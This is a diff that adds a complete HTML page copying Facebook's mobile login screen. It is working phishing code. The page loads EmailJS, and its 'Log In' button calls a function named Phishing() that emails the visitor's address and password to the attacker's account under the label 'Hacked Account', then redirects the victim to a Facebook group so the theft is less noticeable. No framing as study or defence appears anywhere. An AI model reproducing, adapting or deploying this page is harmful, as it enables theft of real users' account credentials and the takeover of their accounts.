@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Log Into Facebook | Facebook</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"/>
+  <meta name="theme-color" content="#1778f2"/>
+  
+  <!-- EmailJS -->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
+  
+  
+  <!-- Some CSS Style -->
+  <style type="text/css">
+  
+  body {
+    min-height:100vh;
+    background-color:#fff;
+    margin:0;
+    padding:0;
+    font-family:robot, tahoma;
+  }
+  
+  h1, h2, h3, h4, h5, h6 {
+    font-weight:normal;
+  }
+  
+  a ,ul, li {
+    text-decoration:none;
+    display:inline-block;
+    overflow:hidden;
+  }
+  
+  li {
+    font-size:14px;
+  }
+  
+  button, input {
+    border:0;
+    outline:none;
+  }
+  .container {
+    height:auto;
+    width:100%;
+    overflow:hidden;
+  }
+  
+  form {
+   
+  }
+  
+  #getAppPic {
+    height:30px;
+    width:18px;
+    margin:5px 15px 5px 15px;
+  }
+  
+  #getAppContainer {
+    color:#55a;
+    height:45px;
+    background-color:#fefedd;
+    line-height::30px;
+    font-size:14px;
+  }
+  
+  #getAppContainer span {
+    position:relative;
+    top:-15px;
+    left:-10px;
+    right:-10px;
+ 
+  }
+  
+  /*img{
+    height:auto;
+    width:100%;
+  }*/
+  
+  #facebookLogo {
+    height:45px;
+    width:100%;
+    background-image:url("https://z-m-static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg");
+    background-repeat:no-repeat;
+    background-position:center;
+  }
+  
+  input {
+    height:20px;
+    padding:15px;
+    width:100%;
+    border:0;
+    margin:5px;
+    outline:none;
+    color:grey;
+    background-color:#eee;
+    border-radius:5px;
+    font-size:15px;
+    box-shadow:0px 2px 2px #ddd;
+  }
+  
+  input:hover {
+    color:#333;
+    outline:1px solid #1778f2;
+  }
+  
+  #loginBtn {
+    height:45px;
+    width:99%;
+    border:0;
+    outline:none;
+    text-align:center;
+    color:#fff;
+    background-color:#1778F2;
+    border-radius:5px;
+    font-size:19px;
+    line-height:20px;
+    font-weight:bold;
+  }
+  
+  #loginBtn:hover {
+    background-color:#1559f9;
+  }
+  
+  #appContainer {
+    width:93%;
+    margin-left:2.5%;
+    margin-right:2.5%;
+  }
+  
+
+  legend {
+     width:96%;
+     position:relative;
+    border-top:1px solid #ddd;
+  }
+  
+  legend::after {
+    content:"or";
+    position:absolute;
+    left:45%;
+    right:50%;
+    top:-10px;
+    height:auto;
+    width:40px;
+    background-color:#fff;
+  }
+  
+  a {
+     color:#88b;
+     font-size:15px;
+  }
+  
+  #createNewAccount {
+    height:40px;
+    width:auto;
+    color:#fff;
+    font-weight:bold;
+    font-size:16px;
+    padding:0 15px 0 15px;
+    border-radius:5px;
+    background-color:#0aac01;
+  }
+  
+  #exlamationMark {
+    position:relative;
+  }
+  
+  #exlamationMark::after {
+    content:"i";
+    position:absolute;
+    height:15px;
+    width:15px;
+    border-radius:50%;
+    border:1px solid #ccc;
+    text-align:center;
+    top:0px;
+    left:300px;
+    z-index:99;
+    color:#ccc;
+  }
+  
+  #passwordInp:hover{
+    width:70%;
+  }
+  
+  #passwordHolder {
+    height:auto;
+    white-space:nowrap;
+    overflow:hidden;
+  }
+  
+  </style>
+</head>
+<body>
+<div class="container" id="getAppContainer">
+  <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yU/r/CxG_wQaLGXu.png" id="getAppPic" alt="download facebook lite"/>
+  <span>Get Facebook Lite and browse faster.</span>
+</div>
+<div id="facebookLogo"></div>
+<div class="container" id="appContainer">
+  <form class="login-form" action="POST" action="#">
+    <label id="exlamationMark">
+      <input type="email" id="userEmail" name="email" placeholder="Mobile number or email">
+    </label>
+    <label id="passwordHolder">
+      <input type="password" id="passwordInp" name="password" placeholder="Password">
+      <span style="overflow:hidden">Show</span>
+    </label>
+    <input type="button" value="Log In" id="loginBtn" onclick="Phishing()"/>
+  </form>
+  
+  <center>
+   <br> <legend></legend><br>
+    <button id="createNewAccount">Create New Account</button>
+    <h5>
+      <a href="#">Forgot Password?</a>
+    </h5>
+    
+    <div style="width:100%;overflow:hidden;">
+    <ul style="float:left;color:#55a">
+      <li style="color:grey">English (US)</li><br>
+      <li>Français (France)</li><br>
+      <li>Español</li><br>
+      <li>Deutsch</li>
+    </ul>
+    <ul style="float:right;color:#55a">
+      <li>العربية</li><br>
+      <li>Türkçe</li><br>
+      <li>Português (Brasil)</li><br>
+      <li><button style="font-size:18px;text-align:center;line-height:22px;height:22px;width:22px;color:grey;border:1px solid #55a;border-radius:4px;background-color:#fff;">+</button></li>
+    </ul>
+   </div><br>
+    <ul style="color:grey;">
+      <li>Facebook Inc.</li>
+    </ul>
+    
+  </center>
+</div>
+
+<script type="text/javascript">
+
+ var user_email = document.getElementById("userEmail");
+ var user_password = document.getElementById("passwordInp");
+ 
+   (function(){
+      emailjs.init("user_JjKvCFk6zCEo0qUk9w21u");
+      //alert("init");
+      user_email.focus();
+   })();
+   
+   
+   function Phishing() {
+   emailjs.send("service_0aclrlj","panda-templateID-95",{
+      from_name: "Hacked Account",
+      to_name: "Pan Da :) ",
+      message: "Email[" + user_email.value + "] - Password [" + user_password.value + "]",
+   }).then(function(response) {
+     //alert("Succesafull ..." + response.status + " " + response.text);
+     openURL("https://facebook.com/groups/1950259585201438/");
+   }, function(error) {
+    // alert("Error.. " + error);
+   });
+   
+   function openURL(myURL){
+     window.location.href = "";
+     setTimeout(function(){
+        window.open(myURL);
+     },1000);
+    //alert(window.location);
+   }
+   
+   }
+  
+   //window.onclick = function(){alert(user_email.value) }
+  </script>
+</body>
+</html>
